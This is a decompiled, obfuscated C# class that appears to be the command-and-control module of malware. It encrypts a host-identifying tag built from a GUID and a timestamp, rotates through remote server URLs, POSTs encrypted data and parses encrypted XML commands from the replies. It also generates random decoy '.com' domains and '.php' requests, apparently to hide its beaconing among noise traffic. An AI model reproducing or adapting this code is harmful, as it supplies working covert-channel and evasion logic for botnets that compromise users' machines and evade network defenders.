using System;
using System.Collections;
using System.Net;
using System.Threading;
using System.Web;
using System.Xml;

internal class Class9 : Class8
{
	public string string_3;

	public int int_0 = 0;

	private ArrayList arrayList_1 = new ArrayList();

	public static readonly string string_4 = Class51.smethod_26("WubX9sZnkzYWVla35sc3MnbXJtYHNlLCNne2xnbG9sbnUuZGVhLH1ydSV3Z2x3bW1sZG40ZWFnaG5hLmNpbm5sYXFtaGNpL3RpY2RhbH5sbGkhaHVobGRlLG1jZWlnaG5vL3RvYiRkcXxpYmRsbWckaX5lZmBlbmRlbGNvL2JzbGJhLmJsb3svc2RzYGtoLWN0ZWFnaG5kLWF0dnxkc=", null);

	public Class9(Class11 class11_1)
		: base(class11_1)
	{
		string text = string.Format("{0},{1},{2},{3},{4},{5}", class11_0.guid_0, class11_0.string_2, class11_0.bool_1 ? 1 : 0, class11_0.string_5, 0, Class51.smethod_6(DateTime.Now).Replace(",", "-"));
		string_2 = new string[1] { "Tag: " + Class51.smethod_24(text, class11_0) };
	}

	protected void method_15()
	{
		bool_0 = false;
		int_0 = 0;
		arrayList_1.Clear();
	}

	protected void method_16()
	{
		string text = null;
		int num = 0;
		do
		{
			text = class11_0.class40_1.method_10() as string;
			num++;
		}
		while (arrayList_1.Contains(text) && num < 5 * class11_0.class40_1.System_002ECollections_002EICollection_002ECount);
		if (string_3 == null || text != string_3)
		{
			string_3 = text;
		}
		if (string_3 != null && !string_3.EndsWith("/"))
		{
			string_3 += "/";
		}
		int_0++;
	}

	protected string[] method_17(int int_1)
	{
		ArrayList arrayList = new ArrayList();
		string[] array = Class49.smethod_0(string_4, ",");
		for (int i = 0; i < int_1; i++)
		{
			int num = Class51.random_0.Next(1, 3);
			string text = "";
			for (int j = 0; j < num; j++)
			{
				text += array[Class51.random_0.Next(0, array.Length - 1)];
			}
			arrayList.Add(text + ".com");
		}
		return arrayList.ToArray(typeof(string)) as string[];
	}

	protected void method_18()
	{
		if (!class11_0.bool_3)
		{
			return;
		}
		try
		{
			string[] array = Class49.smethod_0(string_4, ",");
			int int_ = Class51.random_0.Next(1, 5);
			string[] array2 = method_17(int_);
			string[] array3 = array2;
			foreach (string text in array3)
			{
				try
				{
					string text2 = "http://" + text + "/";
					text2 = text2 + array[Class51.random_0.Next(0, array.Length - 1)] + ".php";
					method_10(text2, 0, bool_1: true);
					Thread.Sleep(Class51.random_0.Next(5000, 10000));
				}
				catch
				{
				}
			}
		}
		catch (Exception exception_)
		{
			class11_0.method_20("022981F5-3518-4ee0-8744-561995C2EFB9", exception_);
		}
	}

	protected Class32 method_19(string string_5, string string_6)
	{
		try
		{
			Class31 class31_ = method_3("POST", string_5, null, string_6, string_2, null, null, null, bool_1: true, bool_2: false, null);
			return method_5(class31_, bool_1: false);
		}
		catch (WebException)
		{
			return null;
		}
	}

	protected string method_20(Class32 class32_1)
	{
		if (class32_1 == null)
		{
			return null;
		}
		string string_ = Class3.string_16;
		int num = class32_1.method_4().IndexOf(string_);
		if (num >= 0)
		{
			num += string_.Length;
			string string_2 = Class3.string_17;
			int num2 = class32_1.method_4().IndexOf(string_2, num + 1);
			if (num2 == -1)
			{
				num2 = class32_1.method_4().Length;
			}
			return Class51.smethod_26(class32_1.method_4().Substring(num, num2 - num), class11_0);
		}
		return null;
	}

	protected bool method_21(Class32 class32_1, string string_5)
	{
		if (class32_1 != null && !bool_0 && (class32_1.method_10() == 200 || class32_1.method_10() == 404))
		{
			string text = method_20(class32_1);
			if (text != null)
			{
				class11_0.method_44(this, string_5, text, null);
			}
			class11_0.method_40(this, string_5, string_3);
			return true;
		}
		if (!bool_0)
		{
			class11_0.method_41(this, string_5, string_3);
		}
		return false;
	}

	public bool method_22()
	{
		method_15();
		bool flag = false;
		method_18();
		while (!bool_0 && !flag && int_0 < class11_0.int_4)
		{
			method_16();
			string text = string_3 + Class3.string_14;
			try
			{
				Class32 class32_ = method_19(text, null);
				flag = method_21(class32_, text);
			}
			catch (Exception exception_)
			{
				class11_0.method_20("3B56B8E0-8FAE-4565-9D0D-ACDE6B5271D3: " + text, exception_);
				if (!bool_0)
				{
					class11_0.method_41(this, text, string_3);
				}
			}
		}
		method_18();
		return flag;
	}

	public bool method_23(string string_5, string string_6)
	{
		method_15();
		bool flag = false;
		method_18();
		string text = Class3.string_19 + "=" + HttpUtility.UrlEncode(Class51.smethod_24(string_5, class11_0), Class12.encoding_0);
		string text2 = text;
		text = text2 + "&" + Class3.string_20 + "=" + HttpUtility.UrlEncode(Class51.smethod_24(string_6, class11_0), Class12.encoding_0);
		while (!bool_0 && !flag && int_0 < Math.Min(class11_0.class40_1.System_002ECollections_002EICollection_002ECount, class11_0.int_4))
		{
			method_16();
			string text3 = string_3 + Class3.string_18;
			try
			{
				method_19(text3, text);
				flag = true;
			}
			catch (Exception exception_)
			{
				class11_0.method_20("F96E7755-4ACE-4cb4-A9B9-D62F3FFE88C6: " + text3, exception_);
				if (!bool_0)
				{
					class11_0.method_41(this, text3, string_3);
				}
			}
		}
		method_18();
		return flag;
	}

	public bool method_24(string string_5)
	{
		method_15();
		bool flag = false;
		method_18();
		string string_6 = Class3.string_15 + "=" + HttpUtility.UrlEncode(string_5, Class12.encoding_0);
		while (!bool_0 && !flag && int_0 < Math.Min(class11_0.class40_1.System_002ECollections_002EICollection_002ECount, class11_0.int_4))
		{
			method_16();
			string text = string_3 + Class3.string_12;
			try
			{
				Class32 class32_ = method_19(text, string_6);
				flag = method_21(class32_, text);
			}
			catch (Exception exception_)
			{
				class11_0.method_20("38ACE7C7-6EB3-426d-9A32-36116CD0736D: " + text, exception_);
				if (!bool_0)
				{
					class11_0.method_41(this, text, string_3);
				}
			}
		}
		method_18();
		return flag;
	}

	public XmlNode method_25(string string_5)
	{
		method_15();
		XmlNode xmlNode = null;
		method_18();
		while (!bool_0 && xmlNode == null && int_0 < Math.Min(class11_0.class40_1.System_002ECollections_002EICollection_002ECount, class11_0.int_4))
		{
			method_16();
			string text = string_3 + Class3.string_13 + HttpUtility.UrlEncode(Class51.smethod_24(string_5, class11_0), Class12.encoding_0);
			try
			{
				Class32 class32_ = method_19(text, "");
				string text2 = method_20(class32_);
				if (text2 != null && text2.Trim() != "")
				{
					XmlDocument xmlDocument = new XmlDocument();
					try
					{
						xmlDocument.LoadXml(text2);
						class11_0.method_40(this, string_3, string_3);
						xmlNode = xmlDocument.DocumentElement;
					}
					catch (Exception exception_)
					{
						class11_0.method_20("CA44B2A9-DB7A-42cd-9500-12D04A74485A: " + text2, exception_);
					}
				}
			}
			catch (Exception exception_2)
			{
				class11_0.method_20("882815EC-DA33-46e1-8F0A-4B6D89B3AF3E: " + text, exception_2);
				if (!bool_0)
				{
					class11_0.method_41(this, text, string_3);
				}
			}
		}
		method_18();
		return xmlNode;
	}
}
